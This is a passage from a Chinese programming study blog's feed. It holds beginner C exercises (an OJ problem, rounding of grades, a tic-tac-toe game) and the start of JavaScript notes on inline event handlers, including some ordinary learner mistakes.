  <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%ld %ld&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">        <span class="keyword">if</span> (istrue(x, y) == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        a[i] = cacux(x, y); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i] = <span class="number">-1</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a[i]);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="自测运行"><a href="#自测运行" class="headerlink" title="自测运行"></a>自测运行</h3><p><img src="https://s2.loli.net/2023/03/12/Darzk5UVZu7MGf2.png" alt="3.png"></p><p>后面也找出问题了,数字太大越界了，尝试了long long还是不行,看了别人的解答发现根本看不懂。</p><p>😩</p>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学生基本信息输入输出引发的思考</title>
      <link href="/2023/03/11/%E5%AD%A6%E7%94%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2023/03/11/%E5%AD%A6%E7%94%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h1 id="BC11-学生基本信息输入"><a href="#BC11-学生基本信息输入" class="headerlink" title="BC11 学生基本信息输入"></a>BC11 学生基本信息输入</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述:"></a>描述:</h2><p>依次输入一个学生的学号，以及3科（C语言，数学，英语）成绩，在屏幕上输出该学生的学号，3科成绩（注：输出成绩时需进行四舍五入且保留2位小数）。</p><h2 id="数据范围："><a href="#数据范围：" class="headerlink" title="数据范围："></a>数据范围：</h2><p>学号满足 1≤n≤20000000,各科成绩使用百分制，且不可能出现负数</p><h2 id="输入描述："><a href="#输入描述：" class="headerlink" title="输入描述："></a>输入描述：</h2><p>学号以及3科成绩，学号和成绩之间用英文分号隔开，成绩之间用英文逗号隔开。</p><h2 id="输出描述："><a href="#输出描述：" class="headerlink" title="输出描述："></a>输出描述：</h2><p>学号，3科成绩，输出格式详见输出样例。</p><h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><p>在开始读入数据时，刚想用int存储学号，想到int能够存取整数的范围，它存的下吗？</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;int size is %d byte.\n&quot;</span> , <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/ZcQwRAYFfjDimXl.png" alt="image.png"></p><p>实际上int的取值范围依赖于计算机系统,这里显示的4Byte，说明可以存取的数字范围是-2147483648～2147483647机2^32 ~ 2^32 - 1,所以用int类型就够了。</p><p>剩下的三个数用float即可，但题目又有要求要四舍五入，如果直接用%.2f的形式他会自动四舍五入吗，搜索资料后，答案有的说会，有的又说不会，我自己试了下是可以的，但有的人说不可以，虽然提交OJ是过了，但还是想写个四舍五入的方法，可以采用放大取余再看余数的范围。因为有三个数需要处理，所以我就写一个函数来解决问题</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//三位小数,我就直接先让它放大1000倍 </span></span><br><span class="line"><span class="type">float</span> <span class="title function_">test</span><span class="params">(<span class="type">float</span> a)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> b = a * <span class="number">1000</span>;</span><br><span class="line"><span class="type">int</span> tmp = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">while</span> (tmp &gt;= <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">tmp = b % <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (tmp &lt; <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">a = (<span class="type">float</span>)(b - tmp) / <span class="number">1000</span>; </span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">a = (<span class="type">float</span>)(b + <span class="number">10</span> - tmp) / <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">float</span> a = <span class="number">80.635</span>;</span><br><span class="line"><span class="type">float</span> b = <span class="number">80.630</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2f\n&quot;</span>, test(a));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2f\n&quot;</span>, test(b));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/7POT96axM8cILXS.png" alt="image.png"></p><p>附上全代码:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">float</span> <span class="title function_">test</span><span class="params">(<span class="type">float</span> a)</span> &#123;</span><br><span class="line">    <span class="type">int</span> b = a * <span class="number">1000</span>;</span><br><span class="line">    <span class="type">int</span> tmp = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">while</span> (tmp &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">        tmp = b % <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (tmp &lt; <span class="number">5</span>) &#123;</span><br><span class="line">        a = (<span class="type">float</span>)(b - tmp) / <span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        a = (<span class="type">float</span>)(b + <span class="number">10</span> - tmp) / <span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">float</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="type">float</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="type">float</span> c = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d;%f,%f,%f&quot;</span>, &amp;n, &amp;a, &amp;b, &amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The each subject score of No. %d is %.2f, %.2f, %.2f.&quot;</span>, n, test(a),</span><br><span class="line">           test(b), test(c));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/qKVIzAuPmN6Jntb.png" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> OJ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三子棋</title>
      <link href="/2023/03/11/%E4%B8%89%E5%AD%90%E6%A3%8B/"/>
      <url>/2023/03/11/%E4%B8%89%E5%AD%90%E6%A3%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="comment">//符号的定义</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROW 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COL 3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="comment">//函数的声明</span></span><br><span class="line"><span class="comment">//初始化棋盘</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitBoard</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印棋盘</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">DisplayBoard</span><span class="params">(<span class="type">char</span> board[ROW][COL],<span class="type">int</span> row,<span class="type">int</span> col)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//玩家下棋</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PlayerMove</span><span class="params">(<span class="type">char</span> board[][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//电脑下棋</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ComputerMove</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.玩家赢了-*</span></span><br><span class="line"><span class="comment">//2.电脑赢了-#</span></span><br><span class="line"><span class="comment">//3.平局-Q</span></span><br><span class="line"><span class="comment">//4.游戏继续-C</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是否赢游戏</span></span><br><span class="line"><span class="type">char</span> <span class="title function_">IsWin</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是否继续游戏</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsFull</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span>;</span><br></pre></td></tr></table></figure><h1 id="函数实现"><a href="#函数实现" class="headerlink" title="函数实现"></a>函数实现</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;game.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitBoard</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; row; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; col; j++)</span><br><span class="line">&#123;</span><br><span class="line">board[i][j] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DisplayBoard</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; row; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; col; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; %c &quot;</span>, board[i][j]);</span><br><span class="line"><span class="keyword">if</span> (j &lt; col - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (i &lt; row - <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; col; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(j &lt; col<span class="number">-1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PlayerMove</span><span class="params">(<span class="type">char</span> board[][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;玩家走:&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入下棋的坐标:&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line"><span class="comment">//判断坐标合法性</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (x &gt;= <span class="number">1</span> &amp;&amp; x &lt;= row &amp;&amp; y &gt;= <span class="number">1</span> &amp;&amp; y &lt;= col)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//下棋</span></span><br><span class="line"><span class="comment">//判断坐标是否被占用</span></span><br><span class="line"><span class="keyword">if</span> (board[x - <span class="number">1</span>][y - <span class="number">1</span>] == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">board[x - <span class="number">1</span>][y - <span class="number">1</span>] = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;坐标被占用,请重新输入\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;坐标非法，请重新从输入\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ComputerMove</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;电脑走:&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> x = rand() % row;</span><br><span class="line"><span class="type">int</span> y = rand() % col;</span><br><span class="line"><span class="comment">//判断占用</span></span><br><span class="line"><span class="keyword">if</span> (board[x][y] == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">board[x][y] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> <span class="title function_">IsWin</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//判断三行</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; row; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (board[i][<span class="number">0</span>] == board[i][<span class="number">1</span>] &amp;&amp; board[i][<span class="number">1</span>] == board[i][<span class="number">2</span>] &amp;&amp; board[i][<span class="number">1</span>] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> board[i][<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断三列</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; col; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (board[<span class="number">0</span>][i] == board[<span class="number">1</span>][i] &amp;&amp; board[<span class="number">1</span>][i] == board[<span class="number">2</span>][i] &amp;&amp; board[<span class="number">1</span>][i] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> board[<span class="number">1</span>][i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断对角</span></span><br><span class="line"><span class="keyword">if</span> (board[<span class="number">0</span>][<span class="number">0</span>] == board[<span class="number">1</span>][<span class="number">1</span>] &amp;&amp; board[<span class="number">1</span>][<span class="number">1</span>] == board[<span class="number">2</span>][<span class="number">2</span>] &amp;&amp; board[<span class="number">0</span>][<span class="number">0</span>] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> board[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (board[<span class="number">0</span>][<span class="number">2</span>] == board[<span class="number">1</span>][<span class="number">1</span>] &amp;&amp; board[<span class="number">1</span>][<span class="number">1</span>] == board[<span class="number">2</span>][<span class="number">0</span>] &amp;&amp; board[<span class="number">0</span>][<span class="number">0</span>] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> board[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断平局</span></span><br><span class="line"><span class="comment">//如果满返回1.不满返回0</span></span><br><span class="line"><span class="type">int</span> ret = IsFull(board,row,col);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;Q&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//继续</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">IsFull</span><span class="params">(<span class="type">char</span> board[ROW][COL], <span class="type">int</span> row, <span class="type">int</span> col)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; row; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; col; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (board[i][j] == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="界面实现"><a href="#界面实现" class="headerlink" title="界面实现"></a>界面实现</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;game.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;********************************\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*******     1.play     *********\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*******     0.exit     *********\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;********************************\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">game</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//存储数据-二维数组（棋盘）</span></span><br><span class="line"><span class="type">char</span> board[ROW][COL];</span><br><span class="line"><span class="comment">//初始化棋盘-初始化空格</span></span><br><span class="line">InitBoard(board, ROW, COL);</span><br><span class="line"><span class="comment">//打印棋盘</span></span><br><span class="line">DisplayBoard(board,ROW,COL);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> ret = IsWin(board, ROW, COL);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//玩家下棋</span></span><br><span class="line">PlayerMove(board, ROW, COL);</span><br><span class="line">DisplayBoard( board, ROW, COL);</span><br><span class="line">ret = IsWin(board, ROW, COL);</span><br><span class="line"><span class="keyword">if</span> (ret != <span class="string">&#x27;C&#x27;</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">//电脑下棋</span></span><br><span class="line">ComputerMove(board, ROW, COL);</span><br><span class="line">DisplayBoard(board, ROW, COL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;玩家赢\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ret == <span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;电脑赢\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;电脑赢了\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">DisplayBoard(board, ROW, COL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> input = <span class="number">0</span>;</span><br><span class="line">srand((<span class="type">unsigned</span> <span class="type">int</span>)time(<span class="literal">NULL</span>));</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">menu();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请选择:&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line"><span class="keyword">switch</span> (input)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">game();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;三子棋游戏\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;退出游戏\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;选择错误，重新选择\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (input);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript学习笔记</title>
      <link href="/2023/03/09/JavaScript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/03/09/JavaScript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript概述"><a href="#JavaScript概述" class="headerlink" title="JavaScript概述"></a>JavaScript概述</h1><ol><li>简称js</li><li>一种脚本语言，脚本语言的特点<br> java语言是一种脚本语言<br> JavaScript的目标程序是以普通文本的形式保存，用记事本可以直接打开的</li><li>JavaScript和JScript的关系</li><li>JavaScript主要用来操作HTML中的节点，产生动态效果</li><li>JavaScript和Java的区别<br> JavaScript运行在浏览器中，浏览器中有JS代码的内核<br> Java运行在JVM中，JavaScript和JAVA没有任何关系<br> Java语言是SUN公司开发的，JavaScript这个名字是SUN公司给起的名<br> JavaScript是一门编程语言，专门用来操作HTML页面中的节点，让王爷产生动态效果的，JavaScript中也有变量，数据类型等</li></ol><h1 id="JavaScript-包括三块：ECMAScript、DOM、BOM"><a href="#JavaScript-包括三块：ECMAScript、DOM、BOM" class="headerlink" title="JavaScript 包括三块：ECMAScript、DOM、BOM"></a>JavaScript 包括三块：ECMAScript、DOM、BOM</h1><ol><li>ECMAScript是ECMA制定的262标准，JavaScript和Jscript都遵守这个标准，ECMAScript是JavaScript核心语法</li><li>DOM编程时通过JavaScript对HTML中的dom节点进行操作，DOM时有规范的，DOM规范时W3C制定的。</li><li>BOM编程是对浏览器本身操作，例如：前进、后退、地址栏、关闭窗口、弹窗等。由于浏览器由不同的厂家制造，所以BOM缺少规范，一般只是有一个默认的行业规范。（Brower Object Model，浏览器对象类型）</li></ol><h1 id="JavaScript-嵌入JS三种方式以及JS的注释"><a href="#JavaScript-嵌入JS三种方式以及JS的注释" class="headerlink" title="JavaScript 嵌入JS三种方式以及JS的注释"></a>JavaScript 嵌入JS三种方式以及JS的注释</h1><h2 id="3-1-行间事件"><a href="#3-1-行间事件" class="headerlink" title="3.1 行间事件"></a>3.1 行间事件</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>在HTML中嵌入JS代码的第一种方式：行间事件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1、需求：用户点击以下这个按钮，弹出一个对话框，对话框上显示：hello world</span></span><br><span class="line"><span class="comment">2、JavaScript是一种事件驱动型的编程语言，通常都是在发生某个事件的时候，去执行</span></span><br><span class="line"><span class="comment">某段代码。其中事件包括很多，例如：鼠标单击事件click，另外还有其它事件，例如：</span></span><br><span class="line"><span class="comment">mouseover是鼠标经过事件等。并且在JavaScript当中任何一个事件都有对应的事件句柄。</span></span><br><span class="line"><span class="comment">例如：click对应的事件句柄是onclick，mouseover对应的事件句柄是onmouseover。</span></span><br><span class="line"><span class="comment">3、所有的事件句柄都是以标签的属性形式存在。例如以下input button就有一个onclick这样属性。</span></span><br><span class="line"><span class="comment">只要有用户点击了以下的这个按钮对象，此时按钮对象上发生了鼠标单击事件，那么注册在</span></span><br><span class="line"><span 